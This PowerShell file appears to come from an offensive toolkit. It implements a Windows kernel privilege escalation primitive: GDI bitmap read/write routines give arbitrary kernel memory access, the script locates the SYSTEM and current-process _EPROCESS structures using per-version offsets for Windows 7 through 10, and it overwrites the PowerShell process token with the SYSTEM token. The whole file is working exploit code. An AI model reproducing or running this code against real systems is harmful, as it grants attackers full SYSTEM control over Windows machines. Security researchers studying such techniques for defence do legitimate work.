function Bitmap-Elevate {
	param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Arbitrary Kernel read
	function Bitmap-Read {
		param ($Address)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	# Arbitrary Kernel write
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' # Win8.1 / 2k12R2
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' # Win8 / 2k12
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' # Win7 / 2k8R2
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}
	
	# Get EPROCESS entry for System process
	echo "`n[>] Leaking SYSTEM _EPROCESS.."
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
	echo "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
	echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
	echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	# Get EPROCESS entry for current process
	echo "`n[>] Leaking current _EPROCESS.."
	echo "[+] Traversing ActiveProcessLinks list"
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
			echo "[+] PID: $NextPID"
			echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	# Duplicate token!
	echo "`n[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}